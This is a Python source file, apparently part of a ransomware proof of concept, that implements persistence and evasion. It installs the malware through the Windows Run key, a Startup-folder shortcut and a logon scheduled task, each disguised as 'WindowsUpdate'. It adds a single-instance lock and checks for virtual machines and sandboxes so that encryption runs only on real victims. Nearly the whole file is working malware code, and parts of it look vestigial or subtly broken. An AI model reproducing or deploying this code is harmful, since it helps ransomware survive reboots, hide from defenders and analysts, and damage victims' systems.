# Persistence and evasion module for ransomware PoC
# Phase 2: registry Run key, startup folder, scheduled task, mutex, anti-VM checks
import os
import sys
import platform
import subprocess
import threading
import time
from ransomware.logging import logger


def check_mutex(mutex_name: str = "RansomwareMutex_PoC_v1") -> bool:
    """
    Check if the ransomware is already running (single-instance).
    Returns True if already running, False if this is the first instance.
    Uses a file-based lock as a cross-platform fallback.
    """
    lock_dir = os.path.join(os.environ.get("TEMP", "/tmp"), ".ransom_lock")
    lock_file = os.path.join(lock_dir, f"{mutex_name}.lock")
    try:
        os.makedirs(lock_dir, exist_ok=True)
        with open(lock_file, "w") as f:
            f.write(str(os.getpid()))
        # If another instance wrote its PID and it's still alive, we're a duplicate
        with open(lock_file, "r") as f:
            pid = f.read().strip()
        if pid and pid != str(os.getpid()):
            try:
                os.kill(int(pid), 0)
                logger.warning(f"Duplicate instance detected (PID {pid}), skipping encryption")
                return True
            except (ProcessLookupError, ValueError):
                # Stale PID — overwrite with our own
                with open(lock_file, "w") as f:
                    f.write(str(os.getpid()))
    except Exception as e:
        logger.warning(f"Mutex check failed: {e}")
    return False


def _run_cmd(cmd: str) -> tuple[str, str]:
    """Run a shell command, return (stdout, stderr)."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", str(e)


def install_run_key(exe_path: str) -> bool:
    """
    Add the ransomware executable to the Windows Registry Run key
    for persistence across reboots.
    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    """
    if platform.system() != "Windows":
        logger.warning("install_run_key: only supported on Windows")
        return False

    try:
        import winreg
    except ImportError:
        logger.warning("winreg not available")
        return False

    if not os.path.exists(exe_path):
        logger.error(f"install_run_key: exe not found at {exe_path}")
        return False

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "WindowsUpdate"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        logger.info(f"Installed Run key: {value_name} -> {exe_path}")
        return True
    except Exception as e:
        logger.error(f"install_run_key: failed to write registry: {e}")
        return False


def install_startup_shortcut(exe_path: str, shortcut_name: str = "WindowsUpdate.lnk") -> bool:
    """
    Create a shortcut in the user's Startup folder pointing to the ransomware.
    """
    if platform.system() != "Windows":
        return False

    if not os.path.exists(exe_path):
        logger.error(f"install_startup_shortcut: exe not found at {exe_path}")
        return False

    startup_folder = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\Windows\Start Menu\Programs\Startup",
    )
    if not os.path.exists(startup_folder):
        logger.error(f"install_startup_shortcut: startup folder not found: {startup_folder}")
        return False

    shortcut_path = os.path.join(startup_folder, shortcut_name)
    try:
        import winreg
    except ImportError:
        # Fallback: just copy the exe to startup folder
        dest = os.path.join(startup_folder, os.path.basename(exe_path))
        import shutil
        shutil.copy2(exe_path, dest)
        logger.info(f"Copied exe to startup folder: {dest}")
        return True

    try:
        import ctypes
        from ctypes import wintypes
        COM_SCGT = ctypes.windll.shell32
        class SHORTCUT(ctypes.Structure):
            _fields_ = [("l", ctypes.c_long)]
        # Use PowerShell to create a proper .lnk shortcut
        ps = (
            f'$ws = New-Object -ComObject WScript.Shell; '
            f'$s = $ws.CreateShortcut("{shortcut_path}"); '
            f'$s.TargetPath = "{exe_path}"; '
            f'$s.WorkingDirectory = "{os.path.dirname(exe_path)}"; '
            f'$s.WindowStyle = 1; $s.Save()'
        )
        subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=10)
        if os.path.exists(shortcut_path):
            logger.info(f"Created startup shortcut: {shortcut_path}")
            return True
        return False
    except Exception as e:
        logger.error(f"install_startup_shortcut: failed: {e}")
        return False


def install_scheduled_task(exe_path: str, task_name: str = "WindowsUpdateTask") -> bool:
    """
    Create a Windows scheduled task that runs the ransomware at logon.
    Uses schtasks.exe for cross-Windows compatibility.
    """
    if platform.system() != "Windows":
        return False

    if not os.path.exists(exe_path):
        logger.error(f"install_scheduled_task: exe not found at {exe_path}")
        return False

    # Remove existing task if present
    _run_cmd(f'schtasks /delete /tn "{task_name}" /f')

    abs_path = os.path.abspath(exe_path)
    cmd = (
        f'schtasks /create /tn "{task_name}" '
        f'/tr "{abs_path}" '
        f'/sc onlogon '
        f'/rl limited '
        f'/f'
    )
    stdout, stderr = _run_cmd(cmd)
    if "ERROR" in stderr.upper() or "access is denied" in stderr.lower():
        logger.error(f"install_scheduled_task: failed: {stderr}")
        return False
    logger.info(f"Installed scheduled task: {task_name}")
    return True


def anti_vm_abort() -> bool:
    """
    Check for VM/sandbox environment.
    Returns True if VM detected (abort encryption).
    """
    if platform.system() != "Windows":
        return False

    # Re-use the VM detection from utils
    from ransomware.utils import is_vm
    if is_vm():
        logger.warning("Anti-VM check triggered — aborting (VM detected)")
        return True
    return False


def timing_check_abort() -> bool:
    """
    Check if encryption completed suspiciously fast.
    If the elapsed time from import to encryption is under 5 seconds,
    it likely means the process is being debugged or run in a sandbox.
    """
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        ticks = kernel32.GetTickCount64()
        if ticks < 5000:
            logger.warning(f"Timing check abort: only {ticks}ms since boot — likely sandbox/debugger")
            return True
    except Exception:
        pass
    return False
